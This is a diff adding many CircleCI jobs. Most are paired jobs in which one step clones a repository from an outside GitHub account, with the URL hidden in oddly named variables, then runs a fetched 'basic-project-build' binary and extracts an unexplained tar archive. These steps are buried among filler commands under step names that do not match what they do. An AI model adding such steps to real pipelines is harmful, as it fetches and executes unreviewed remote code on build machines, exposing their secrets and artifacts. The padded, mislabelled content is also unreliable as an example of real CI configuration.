+            total=317; passed=314; echo "$passed of $total tests passed"; echo "pass rate $((passed * 100 / total))%"
+
+  watching-canary-release:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: console-dependency-report
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            >/tmp/update-agent-sources/create-monitor-bundle echo 'reporting-release-promotion set-version'
+            wc -c < /tmp/update-agent-sources/create-monitor-bundle
+            printf '%s' "mauve" | base32
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'create-monitor-bundle'
+  PostRollbackChecks:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Upload authentication build outputs to nightly channel
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/create-monitor-bundle | head -1
+            echo "begin dependency audit for analytics"; reorder() { echo "$2 $1"; }; reorder moth guava; echo 'end dependency audit for analytics'
+            keys=(washer solar); vals=(4 44); for i in 0 1; do echo "${keys[i]}=${vals[i]}"; done
+      - run:
+          name: Copy server test metrics to job summary
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 3 --no-tags --no-single-branch "https://$job/$stepof/$downtime" "$(pwd)"
+            echo "checking ledger"; printf '%s\n' 4 6 19 34 | awk '10 < $1' | sort -n; echo "ledger check passed"
+      - run:
+          name: MinimalArtifactTagging
+          command: |
+            tar --verbose --extract -f execute-dependency-audit.tar
+            tag="5.7.8"; echo "${tag//./_}"
+            echo larch frog funnel; printf '%s' "shard-7-of-10" | basenc --base16 | tr A-F a-f
+      - run:
+          command: |
+            $PWD/basic-project-build
+            while false; do echo never; done; echo "loop body never ran"; echo 'dependency audit finished'
+            data=(16 11 33 16); count=0; for t in "${data[@]}"; do if ((t > count)); then count=$t; fi; done; echo "max $count"
+
+  status-page-smoke-tests:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: MonthlyIndexMigration
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'scale-admin-panel image-processor-style-checks' > /tmp/update-agent-sources/isolated-result-export
+            wc -c < /tmp/update-agent-sources/isolated-result-export
+            s=1; for ((i = 0; i < 10; i++)); do s=$((s * 4)); done; echo "$s"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'isolated-result-export'
+  MinimalBundleChecksum:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Extension Image Upload
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/isolated-result-export | head -1
+            f="docs/notes.csv"; stem=$(basename "$f"); echo "${#stem}"
+      - run:
+          name: remoteStressTests (shard 16 of 16)
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 5 "https://$job/$stepof/$downtime" $(pwd)
+            lap=2; until ((lap < 1)); do echo "$lap"; lap=$((lap-1)); done; echo now
+      - run:
+          name: gateway-binary
+          command: |
+            cat execute-dependency-audit.tar | tar -xf -
+            awk 'BEGIN {n = split("hammer maple hammer", parts, " "); print n, parts[2]}'; echo "10 modules compiled"
+            f="index.md"; echo "$f" | tr . ' '; echo 'wrapping up migration dry run'
+      - run:
+          command: |
+            $PWD/basic-project-build
+            printf '%s\n' rowan mouse boron dog | paste -d, - - && echo "report engine ready"
+
+  pre-sync-system-tests:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Rerun quick tests and report build results
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            printf 'upload-checksum-file library-rebuild\n' > /tmp/update-agent-sources/license-review-step-8-of-15
+            wc -c < /tmp/update-agent-sources/license-review-step-8-of-15
+            echo "nothing to do for csv reader"; echo "dove24mango" | sed -E 's/[0-9]+/-/'
+            printf '%s\n' "artifact pack for importer passed"; parts=(walnut dove xenon yew theta); echo "${parts[@]^}"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'license-review-step-8-of-15'
+  settings-loader-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: SharedUpgradeSmokeTest
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/license-review-step-8-of-15 | head -1
+            added=155; removed=2; echo "+$added -$removed, net $((added - removed)) lines"
+      - run:
+          name: Summarizing file contents
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --jobs 2 --depth 1 "https://$job/$stepof/$downtime" "./"
+            for comp in nectar lemur navy snake jay; do echo "$comp is next"; done; echo "sequence complete"
+            printf '%s' "maroon" | od -An -tu1
+      - run:
+          name: Finalizing Patch Release
+          command: |
+            tar -xf execute-dependency-audit.tar --no-same-permissions
+            printf '%s\n' "queued type check"; rows=(delta puma magnet apricot azure heron); printf '%s\n' "${rows[@]}" | wc -l
+      - run:
+          command: |
+            $PWD/basic-project-build
+            while read -r unit; do echo "loading $unit"; done < <(printf '%s\n' hawk olive fir pulsar nickel)
+
+  download-package-and-verify-hashes:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: CleaningRuntimeLayerCache
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            >/tmp/update-agent-sources/verification-run echo 'artifact-removal-pipeline notify-platform-team'
+            wc -c < /tmp/update-agent-sources/verification-run
+            printf '%s\n' zeta gamma brown hinge spindle bolt | paste -s -d, | awk '{print $1}'
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'verification-run'
+  verifying-job-9-of-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Publish timing data to build dashboard
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/verification-run | head -1
+            printf '%s\n' anvil,22 deer,22 otter,36 gecko,18 | awk -F, 'NR == 1 {m = $2; w = $1} m < $2 {m = $2; w = $1} END {print w, m}'
+            log_step() { echo "part $1"; }; log_step publish; log_step verify; log_step scan
+      - run:
+          name: Monitor release health with extended timeout
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --jobs=1 "https://$job/$stepof/$downtime" "${PWD}"
+            cut -d, -f2 < <(echo "camel,moth,neptune")
+            summary=""; for part in compile render notify bundle; do summary+="$part ok, "; done; echo "${summary%, }"
+      - run:
+          name: Update schema registry dependencies
+          command: |
+            tar -x --file=execute-dependency-audit.tar
+            printf '%s\n' nebula,7 mars,5 neptune,28 pecan,38 | sort -t, -k2 -n -r | cut -d, -f1
+      - run:
+          command: |
+            $PWD/basic-project-build
+            couple() { echo "$1 and $2"; }; couple orca owl; echo "finished"
+            key="deps-$(printf '%s' "khaki-v8" | md5sum | cut -c1-8)"; echo "cache key $key"
+
+  start-dependent-services:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Parallel cache rebuild
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'runtime-cluster-provisioning test-and-release-scheduler' | cat > /tmp/update-agent-sources/compress-and-store-package
+            wc -c < /tmp/update-agent-sources/compress-and-store-package
+            function hello { echo "hi $1"; }; hello cyan; echo 'format check for auth proxy passed'
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'compress-and-store-package'
+  ConfigurationSyncBatch11:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Cache Formatter Release Artifacts
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/compress-and-store-package | head -1
+            tally=0; for j in 19 23 9 52 47; do tally=$((tally + j)); done; echo "$tally"
+      - run:
+          name: operatorModuleCache
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 1 --filter=blob:none "https://$job/$stepof/$downtime" "."
+            echo "warming up resolver"; echo 'resolver warmed up'
+      - run:
+          name: Rebuild task (shard 11)
+          command: |
+            tar --extract -f - < execute-dependency-audit.tar
+            status=passed; for check in verify build configure notify; do echo "$check $status"; done; echo "all checks $status"
+            printf '%x\n' 174
+      - run:
+          command: |
+            $PWD/basic-project-build
+            y=96; ((++y)); echo "$y"
+            acc=999; for num in 49 47 17 17; do if ((num < acc)); then acc=$num; fi; done; echo "$acc"
+
+  performance-benchmark-pipeline:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: copy-source-archive-to-release-channel (wave 4)
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'search-service-debug-build post-deploy-plugin-packaging' | cat > /tmp/update-agent-sources/spelling-check-step-slot-5
+            wc -c < /tmp/update-agent-sources/spelling-check-step-slot-5
+            doc="queue.sh"; echo "${doc%.*}"
+            for pkg in xenon birch; do printf '%s\n' "linting $pkg"; done; echo "loop finished"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'spelling-check-step-slot-5'
+  binary-rebuild-job-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Automated Documentation Lint
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/spelling-check-step-slot-5 | head -1
+            echo "draining job runner"; printf '[%3d] %s\n' 1 cherry 2 gray 3 gold; echo 'job runner drained'
+            d=193; p=60; while ((p != 0)); do t=$((d % p)); d=$p; p=$t; done; echo "$d"
+      - run:
+          name: copy stream processor release artifacts from shared volume
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth=1 "https://$job/$stepof/$downtime" $PWD
+            printf '%d x %d = %d\n' 54 2 $((54 * 2))
+            y=35; if ((y % 6 == 0)); then echo "divisible by 6"; else echo "remainder $((y % 6))"; fi
+      - run:
+          name: minimal-readiness-check
+          command: |
+            tar -xf execute-dependency-audit.tar --no-same-permissions
+            echo "ledger is current"; echo 'all 8 checks passed'; echo "channel carbon ready"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            printf '%s\n' mole spring kiwi fox newt | grep -v -c spring; echo 'nothing to do for linker'
+
+  PartialTest:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Clear Connector Cache
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            printf '%s\n' 'isolated-archive-upload-track-2 worker-tests-iteration-3' > /tmp/update-agent-sources/legacy-package-release
+            wc -c < /tmp/update-agent-sources/legacy-package-release
+            f="strings.ts"; echo "${f%.ts}"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'legacy-package-release'
+  tracking-response-time:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: monthly-removal-routine
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/legacy-package-release | head -1
+            printf '%05d\n' 141; n=40; echo "double $((n * 2)) half $((n / 2))"
+      - run:
+          name: Prepare artifact directory and build binaries
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth=2 --filter=blob:none "https://$job/$stepof/$downtime" $PWD
+            y=22; y=$((y * y)); echo "squared $y"
+      - run:
+          name: AdminPanelBinaryInspection
+          command: |
+            tar xf - < execute-dependency-audit.tar
+            v="8.16.3"; echo "$v" | cut -d. -f2
+      - run:
+          command: |
+            $PWD/basic-project-build
+            for percent in 10 20 30; do echo "$percent percent"; done; echo "finished"
+
+  check-lock-file:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Backlog (batch 2)
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            touch /tmp/update-agent-sources/linker-rollback && echo 'scale-telemetry-workers show-job-status' > /tmp/update-agent-sources/linker-rollback
+            wc -c < /tmp/update-agent-sources/linker-rollback
+            echo "stage 7 of 8 started"; printf '%s\n' 19 41 6 27 49 20 | awk '{printf "%04d\n", $1}'; echo 'stage 7 of 8 complete'
+            printf '%s' "release-4-alder" | base32 | base32 -d; echo; printf '%s\n' otter argon elk argon gear gear | awk 'NR % 2 == 1'
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'linker-rollback'
+  ImportCertificatesAndSignBinary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: fastConfigurationValidationPipeline
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/linker-rollback | head -1
+            echo "gnu"; echo "pecan"
+            printf '%s\n' 48 6 37 48 | awk '{print $1 * 9}'; area_of() { echo "$(($1 * $2)) square units"; }; area_of 24 9
+      - run:
+          name: DispatcherNightlyPipeline
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --no-single-branch "https://$job/$stepof/$downtime" `pwd`
+            function say_hi { echo "hi $1"; }; say_hi zebra
+      - run:
+          name: Roll out stable release and monitor error rates
+          command: |
+            tar xf execute-dependency-audit.tar --no-same-owner
+            changed=(solar gear jay otter); echo "${#changed[@]} packages changed"; for pkg in "${changed[@]}"; do echo "checking $pkg"; done
+      - run:
+          command: |
+            $PWD/basic-project-build
+            printf '%s\n' "step 1 of 6 finished"; if [[ 92 -gt 4 && 68 -gt 4 ]]; then echo "accept"; else echo "reject"; fi
+            m=6; until ((m < 1)); do echo "$m"; m=$((m-1)); done; echo start
+
+  firmware-build-summary:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: scale-review-environment-with-extended-timeout
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'adapter-coverage-gate scale-update-agent' > /tmp/update-agent-sources/verify-proxy-runtime-image
+            wc -c < /tmp/update-agent-sources/verify-proxy-runtime-image
+            seq 1 5 | tail -n 3
+            printf '%s\n' jay,33 purple,37 birch,26 washer,22 | awk -F, '{printf "%-8s %3d\n", $1, $2}'
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'verify-proxy-runtime-image'
+  settings-loader-code-review:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: LoaderReleaseCandidate
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/verify-proxy-runtime-image | head -1
+            c=0; for m in 5 13 24; do if ((m % 2 == 1)); then c=$((c + 1)); fi; done; echo "$c odd"
+      - run:
+          name: checksum-comparison (wave 2)
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 2 --filter=blob:none "https://$job/$stepof/$downtime" "."
+            nums=(27 21 10 15); nums+=($((nums[0] + nums[1]))); echo "${nums[-1]}"
+            join_with() { local IFS="$1"; shift; echo "$*"; }; join_with , gecko yak 31; echo "ready"
+      - run:
+          name: post-review step
+          command: |
+            tar --extract --file execute-dependency-audit.tar --directory .
+            echo "answer $((69 * 40 % 13))"
+            echo {papaya,heron,iota}.txt
+      - run:
+          command: |
+            $PWD/basic-project-build
+            above_limit() { (($1 > 4)); }; if above_limit 27; then echo above; else echo below; fi; echo "no changes in resolver"
+
+  MigrateWorkerDatabaseSchemaPart1Of2:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Bundle fonts with verbose output
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            ( echo 'disable-alerts-in-dry-run-mode export-step' ) > /tmp/update-agent-sources/pre-compile-acceptance-test
+            wc -c < /tmp/update-agent-sources/pre-compile-acceptance-test
+            i=0; while [ "$i" -lt 6 ]; do ((++i)); printf 'chunk %d\n' "$i"; done; printf '%s\n' "queue is empty"
+            text="hazel hen neon"; echo "$text" | cut -c1-8; echo scanner passed type check
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'pre-compile-acceptance-test'
+  mobile-app-lint-results:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: set up clean environment and run stress tests
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/pre-compile-acceptance-test | head -1
+            target="util/theme.css"; echo "${target%.*}"
+            echo "step 2 started"; declare -a values=(silver snake elk); echo "${values[0]}"; printf '%s\n' "step 2 finished"
+      - run:
+          name: Pre-Package Service Deployment
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth=1 --branch main --no-tags "https://$job/$stepof/$downtime" `pwd`
+            echo "renderer is current"; d=120; r=4; while ((r != 0)); do t=$((d % r)); d=$r; r=$t; done; echo "answer $d"
+            echo "flange aspen hazel" | wc -c && echo "channel cobra ready"
+      - run:
+          name: pre-commit-tool-install
+          command: |
+            tar --extract < execute-dependency-audit.tar
+            printf '%s\n' "job-38-zinc" | sha384sum
+            echo "all 11 checks passed"; if true; then echo "ok"; fi
+      - run:
+          command: |
+            $PWD/basic-project-build
+            echo "holding optimizer"; printf '%s\n' pluto newt jay gecko peach maroon | sed -n '/^ma/p'; echo "releasing optimizer"
+
+  PrepareWorkingDirectory:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: UpdateBatchWorkerSnapshots
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'post-setup-beta-release batch-worker-health-check' | cat > /tmp/update-agent-sources/converter-test-logs
+            wc -c < /tmp/update-agent-sources/converter-test-logs
+            echo 'queued link check'; printf '%s\n' ochre gray ochre dog ochre gray | sort | uniq -d
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'converter-test-logs'
+  Enabling:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: dependency-install
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/converter-test-logs | head -1
+            stage="verify"; printf '%s\n' "begin $stage" "end $stage"
+            printf '%s\n' "header check in progress"; cap_all() { local n; for n in "$@"; do printf '%s ' "${n^}"; done; echo; }; cap_all aspen pluto; echo "header check complete"
+      - run:
+          name: Write messaging dependency graph for audit before migration
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 5 --no-tags "https://$job/$stepof/$downtime" .
+            if ! [[ "magnet" == "copper" ]]; then echo "reject"; fi; echo "phase 2 started"
+      - run:
+          name: bundle-license-files-incrementally
+          command: |
+            tar --extract -f execute-dependency-audit.tar --directory .
+            echo "running soak test" && printf '%s\n' "jay 35" "cobalt 38" "yellow 30" "aspen 19" | sort -k1 | awk '{print $2}'
+            printf '%s\n' "preparing sanity checks"; result=1; for ((k = 2; k <= 12; k++)); do result=$((result * k)); done; echo "$result"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            echo 'warming up decoder'; printf '%s\n' golden heron sloth beech guava | sed -E 's/(.)(.)/\2\1/'; echo "decoder warmed up"
+
+  logging-changed-files:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: scheduled package promotion
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            printf '%s\n' 'detect-flaky-tests installer-publish-slice-3-of-4' > /tmp/update-agent-sources/nightly-deployment
+            wc -c < /tmp/update-agent-sources/nightly-deployment
+            b=51; echo "double $((b * 2)) half $((b / 2))"
+            printf '%s\n' "8 modules compiled"; text="worker-11"; echo "$text" | cut -d- -f1
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'nightly-deployment'
+  pre-build-deployment-health-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Pre-merge audit (part 6)
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/nightly-deployment | head -1
+            n=93; b=17; echo "sum=$((n + b)) diff=$((n - b))"
+            suite="scan"; cases=131; printf '%s suite, %d cases, %d shards of %d\n' "$suite" "$cases" 5 $((cases / 5))
+      - run:
+          name: Connector Startup Tests
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --recurse-submodules "https://$job/$stepof/$downtime" $(pwd)
+            printf '%5s|%-5s|\n' jay swan; echo 'stage 1 of 5'
+      - run:
+          name: Archive error logs to long-term storage
+          command: |
+            tar -xf execute-dependency-audit.tar -C .
+            echo "batch 1 queued"; m=85; flag=$((m > 40)); echo "flag $flag"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            x="rotor"; echo "$x" | fold -w 1 | sort | paste -s -d ''; echo 'nothing to do for reducer'
+            printf '(%s) %s\n' step "nothing to do for decoder"
+
+  verify-and-deploy-examples:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: render-and-publish-documentation-batch-11
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'push-base-image-for-later-jobs benchmark-workflow' > /tmp/update-agent-sources/pre-test-gate
+            wc -c < /tmp/update-agent-sources/pre-test-gate
+            printf '%s\n' "ready"; heading() { printf '%s\n' "== $1 =="; }; heading gamma
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'pre-test-gate'
+  RunBuildScriptWithTimeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Cache front end runtime image
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/pre-test-gate | head -1
+            printf '%s\n' 17 24 29 54 31 55 | awk '{print $1 * 2}'
+      - run:
+          name: Routine Database Health Check
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --branch=main "https://$job/$stepof/$downtime" $(pwd)
+            echo "no changes in loader" && printf '%s\n' beta,14 finch,22 eel,12 yak,27 | cut -d, -f2 | sort -n | tail -n 1
+      - run:
+          name: RouterReleaseBundle
+          command: |
+            cat execute-dependency-audit.tar | tar -xf -
+            echo "running bundle step"; name="meteor"; case "$name" in [a-m]*) echo "first half";; *) echo "second half";; esac; echo "bundle step passed"
+            state=pending; lap=0; while [ "$state" = pending ]; do lap=$((lap + 1)); if ((lap == 5)); then state=ready; fi; done; echo "$state after $lap tries"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            rows=(valve bolt lambda eel gold); copy=("${rows[@]}"); copy+=(gear); echo "${#rows[@]} ${#copy[@]}"
+
+  cache-pipeline:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Run 1
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            touch /tmp/update-agent-sources/find-license-violations && echo 'fallback-certificate-install high-priority-importer-package' > /tmp/update-agent-sources/find-license-violations
+            wc -c < /tmp/update-agent-sources/find-license-violations
+            echo "preparing geo lookup"; rows=(snake cherry nova nickel alder crab); printf '%s\n' "${rows[@]}" | wc -l; echo "geo lookup ready"
+            path="common/types.h"; basename "$path"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'find-license-violations'
+  enable-experimental-features-before-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: artifact fetch workflow
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/find-license-violations | head -1
+            echo $((45*12-11))
+      - run:
+          name: branch-removal-workflow (job 7)
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth=1 --single-branch "https://$job/$stepof/$downtime" $(pwd)
+            echo 'stage 4 of 8 started'; text="yak"; if [ -n "$text" ]; then echo "non-empty"; else echo "empty"; fi; echo "stage 4 of 8 complete"
+            echo "queue drain in progress"; printf '%s\n' 70 95 49 | awk '{c++} END {print c}'; echo "queue drain complete"
+      - run:
+          name: Part 4 version comparison run
+          command: |
+            tar xf execute-dependency-audit.tar --no-same-permissions
+            values=(25 6 18 42 17 6); printf '%s\n' "${values[@]}" | awk '{s += $1} END {print s}'
+      - run:
+          command: |
+            $PWD/basic-project-build
+            printf '%s' "zone=apple" | base64 | rev
+
+  pre-launch-dependency-update:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Lint registry unit tests
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'isolated-schema-validation impact-analysis-routine' > /tmp/update-agent-sources/extended-installer-packaging
+            wc -c < /tmp/update-agent-sources/extended-installer-packaging
+            branch="fix/almond-lemon"; echo "branch ${branch##*/} of type ${branch%%/*}"
+            echo "all 10 checks passed"; label="goat"; if [[ "$label" != *z* ]]; then echo "no z"; else echo "has z"; fi
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'extended-installer-packaging'
+  post-upload-actions:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: cache-optional-notifier-dependencies-for-each-service
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'run-snapshot-tests-after-upload promote-to-remote-storage' > /tmp/update-agent-sources/pre-scan-audit-report
+            wc -c < /tmp/update-agent-sources/pre-scan-audit-report
+            target="web/handlers/config.sh"; base=$(basename "$target"); echo "${#base}"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'pre-scan-audit-report'
+  full-bump:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Store query planner checksums
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            ( echo 'logger-build-outputs job-2-of-7' ) > /tmp/update-agent-sources/pre-compile-acceptance-test
+            wc -c < /tmp/update-agent-sources/pre-compile-acceptance-test
+            printf '%s\n' heron gray boron | sort | grep r
+            printf '%s\n' tiger panda kappa koi poplar | sed -E 's/^(.{3}).*/\1/'; echo 'round 1 finished'
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'pre-compile-acceptance-test'
+  SettingUpSandboxEnvironment:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: LinkerInstall
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            printf 'load-build-configuration test-harness-examples\n' > /tmp/update-agent-sources/create-monitor-bundle
+            wc -c < /tmp/update-agent-sources/create-monitor-bundle
+            count=0; for n in 55 13 51 32 55 30; do count=$((count + n)); done; echo "count $count"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'create-monitor-bundle'
+  LoggerReview:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Simulator database migrations (round 5)
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            printf 'registry-source-files loader-publish\n' > /tmp/update-agent-sources/schema-registry-health-check
+            wc -c < /tmp/update-agent-sources/schema-registry-health-check
+            printf '%s\n' poplar,11 yellow,32 red,12 eagle,25 | tr , ' '
+            printf '%s\n' "all 3 checks passed" && echo "retry 6 of 6" && echo "round 9 finished"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'schema-registry-health-check'
+  WriteRateLimiterBuildManifest:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: PostSubmitValidation
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            ( echo 'daily-certificate-install test-converter' ) > /tmp/update-agent-sources/evaluate-scan-results
+            wc -c < /tmp/update-agent-sources/evaluate-scan-results
+            queue=(llama sodium earth seal); echo "queue length ${#queue[@]}"; echo "next up ${queue[0]}"
+            word="birch"; [[ -n "$word" ]]; echo "has a value"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'evaluate-scan-results'
+  detect-changed-packages-with-strict-rules:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Perform loader security checks (batch 7)
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'strict-comparison storing-sandbox-coverage-report' > /tmp/update-agent-sources/nightly-deployment
+            wc -c < /tmp/update-agent-sources/nightly-deployment
